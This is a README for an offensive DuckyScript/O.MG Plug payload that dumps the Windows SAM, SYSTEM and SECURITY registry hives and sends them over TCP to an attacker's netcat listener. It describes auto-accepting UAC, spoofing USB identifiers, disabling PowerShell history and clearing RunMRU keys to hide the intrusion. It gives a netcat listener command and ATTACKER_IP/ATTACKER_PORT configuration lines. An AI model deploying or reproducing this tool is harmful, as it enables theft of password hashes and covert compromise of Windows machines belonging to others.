# windows-registry-hive-exfil

`windows-registry-hive-exfil` is an O.MG Plug / DuckyScript payload that automatically dumps Windows Registry hives (`SYSTEM`, `SAM`, and `SECURITY`) and exfiltrates them over the network to a remote netcat listener.

## Features

* Randomizes USB device descriptors (`VID`, `PID`, serials) on boot
* Spawns an elevated PowerShell prompt and auto-accepts UAC
* Extracts `SAM`, `SYSTEM`, and `SECURITY` registry hives using native `reg.exe`
* Compresses and exfiltrates hive data over a raw .NET TCP socket (`System.Net.Sockets.TcpClient`)
* Disables PowerShell history logging (`Set-PSReadLineOption -HistorySaveStyle SaveNothing`)
* Clears Explorer `RunMRU` registry keys and deletes temporary `.save` and `.zip` files post-transfer

## Prerequisites

* Windows 10/11 or Windows Server (requires Administrative privileges)
* O.MG Plug, USB Rubber Ducky, or compatible DuckyScript hardware
* Listener machine reachable on target local network running `netcat` or `ncat`

## Installation
```bash
git clone https://github.com/kipair/windows-registry-hive-exfil.git
cd windows-registry-hive-exfil
```

## Usage

Start your listener on the receiver host to capture incoming hive data:

```bash
# Example netcat listener setup
nc -lvnp 4444 > registry_hives.tar.gz
```

Configure target parameters in `payload.txt`:

```
REM Target Receiver IP and Port
DEFINE $ATTACKER_IP 192.168.1.50
DEFINE $ATTACKER_PORT 4444
```

Upload your payload script to the O.MG device GUI and execute the script.
